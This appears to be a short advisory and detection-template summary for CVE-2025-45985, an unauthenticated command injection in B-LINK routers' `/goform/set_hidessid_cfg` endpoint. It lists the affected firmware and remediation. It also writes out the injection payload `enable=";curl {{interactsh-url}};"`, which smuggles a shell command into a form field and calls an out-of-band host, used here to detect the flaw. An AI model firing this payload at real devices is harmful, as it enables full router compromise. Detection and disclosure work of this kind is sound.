## Vulnerability
Blink Router (B-LINK/LB-LINK) contains a command injection vulnerability (CWE-77, CVE-2025-45985) in the `bs_SetSSIDHide` function. Unauthenticated remote attackers can inject arbitrary OS commands via the `enable` parameter on the `/goform/set_hidessid_cfg` endpoint, resulting in full device compromise (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H score 9.8, EPSS 0.27654 at 96.334th percentile).  
Affected firmware: BL-WR9000 V2.4.9, BL-AC2100_AZ3 V1.0.4, BL-X10_AC8 v1.0.5, BL-LTE300 v1.2.3, BL-F1200_AT1 v1.0.0, BL-X26_AC8 v1.2.8, BLAC450M_AE4 v4.0.0, BL-X26_DA3 v1.2.7.  
Remediation: Upgrade to latest firmware with proper command sanitization.

## PoC / Detection
Classification: rce

Template performs a single unauthenticated POST to `/goform/set_hidessid_cfg` (with static `Cookie: platform=0; user=admin`) injecting the payload `enable=";curl {{interactsh-url}};"` into the `type=sethide2` form. Detection succeeds on HTTP 200 response containing both `"type":` and `"result":` in body JSON plus confirmed DNS interaction on interactsh.
